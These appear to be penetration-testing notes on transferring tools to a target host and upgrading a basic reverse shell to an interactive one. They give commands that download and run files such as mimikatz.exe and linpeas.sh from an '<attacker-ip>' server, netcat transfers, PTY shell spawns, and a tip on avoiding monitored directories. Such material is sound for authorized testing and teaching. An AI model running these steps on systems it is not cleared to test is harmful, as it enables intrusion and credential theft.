# Transferring Files → Upgrading Shells 

> ⚠️ **Only on systems you are explicitly authorized to test.**
> These notes show simple, native ways to move tools to a target and make a fragile shell usable for interactive work.

---

## Transferring files to a target 

Common pattern when you *don’t* have a full management session (Meterpreter, WinRM, SSH):

1. Host the file(s) on your attacker machine (HTTP server).
2. From the target, download the file using native utilities (wget, curl, certutil, powershell, etc.).
3. Make executable and run (if needed).

This two-step approach avoids needing complex upload helpers and works even when the target is very locked down.

---

## 1) Quick web server with Python

**Python 3**

```bash
# in the directory containing files you want to serve
python3 -m http.server 8080
```

**Python 2**

```bash
python -m SimpleHTTPServer 80
# or:
python -m SimpleHTTPServer 443
```

* Serves files from the current directory.
* Logs basic GET/404 requests to stdout.
* Choose a port your target can reach (80/443/8080 are common).

---

## 2) Downloading files from the target

### Linux / macOS

```bash
# download to current directory
wget http://<attacker-ip>:8080/payload.php
# or
curl -O http://<attacker-ip>:8080/linpeas.sh
```

### Windows (native: certutil)

Useful when PowerShell is restricted:

```powershell
CertUtil -urlcache -f http://<attacker-ip>/mimikatz.exe mimikatz.exe
```

* Saves remote file as `mimikatz.exe` (or any filename you choose).
* Works without a browser.

### Alternative transfer: Netcat 

On attacker:

```bash
nc -nvlp 9000 < ./file_to_send
```

On target:

```bash
nc <attacker-ip> 9000 > received_file
chmod +x received_file
```

---

## 3) Upgrading non-interactive shells

When you get a basic reverse shell it may be non-interactive . Use these to spawn an interactive shell.

### Quick try: bash interactive

```bash
/bin/bash -i
```

If this works you’ll get prompt-like behavior immediately.

### Check available shells

```bash
cat /etc/shells
```

Common entries: `/bin/bash`, `/bin/sh`, `/bin/dash`

### Python PTY
```bash
# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Perl / Ruby fallbacks

```bash
# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'
```

These spawn a bash process under the context of the current shell/session.

---

## 4) Fixing the environment (PATH, TERM, SHELL)

After upgrading you often need to set environment variables so command lookup, terminal behavior, and interactive features work properly.

```bash
# Inspect current env
env

# Set PATH so common commands are found
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set terminal type for correct line editing & colors
export TERM=xterm

# Set SHELL variable (not strictly required but useful)
export SHELL=/bin/bash
```

### Why do this?

* **PATH**: If PATH is empty or minimal, commands like `ls`, `wget`, `which` may not run because the shell can't find them. Exporting PATH ensures the shell can locate binaries.
* **TERM**: Terminal type controls how programs handle cursor movement, colors, and special keys. Without a proper TERM programs like `vim`, `less`, or interactive shells might misbehave.
* **SHELL**: Declaring `SHELL` helps some programs determine startup behavior; not always required but a good practice.

Setting these is **recommended** to stabilize the session — many scripts and tooling expect them.

---

## 5) Verify and use common utilities

After upgrading and fixing environment variables, verify commands work:

```bash
ls -alps
which wget || echo "wget missing"
wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

---

## 6) Simple ASCII diagram (flow)

```
[Attacker machine]
   (python3 -m http.server 8080)
         |
  http://<attacker-ip>:8080/payload
         |
    [Target machine]
   wget / curl / certutil
         |
  saved file → chmod +x → execute
         |
  if shell is non-interactive:
    python -c 'import pty; pty.spawn("/bin/bash")'
    export PATH=...
    export TERM=xterm
```

---

## 7) Quick notes & hygiene

* Avoid `/tmp` on monitored systems if you can — defenders often monitor uploads there. Prefer less obvious directories depending on rules of engagement.
* Always `chmod +x` binaries/scripts after transfer if they need execute permission.
* If you must use `python -m http.server` over a public network, consider firewall and exposure risks — run in a controlled lab or ephemeral environment.
* Always document transfers in your notes/report (file, hashes, timestamps) and remove tools when done if the engagement requires cleanup.

---
